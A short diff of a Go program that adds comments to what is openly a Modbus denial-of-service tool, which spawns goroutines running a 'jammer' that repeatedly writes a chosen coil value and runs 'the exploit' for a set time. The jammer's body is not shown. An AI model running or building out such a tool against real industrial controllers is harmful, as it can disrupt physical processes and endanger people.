@@ -60,14 +60,16 @@ func main() {
 
 	defer handler.Close()
 
-	client := modbus.NewClient(handler)
+	client := modbus.NewClient(handler) //Create a new Modbus connection
 
-	for i := 0; i < jamming; i++ {
+	//Jamming flag set the for loop upper bound.
+	for i := 0; i < jamming; i++ { //Create multiple go routines for the jammer function
 		wait.Add(1)
 		go jammer(client, uint16(coil), coil_val)
 	}
 
 	fmt.Println("Starting denial attack...")
+
 	//Runs the exploit for the specified duration
 	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
 	go func() {
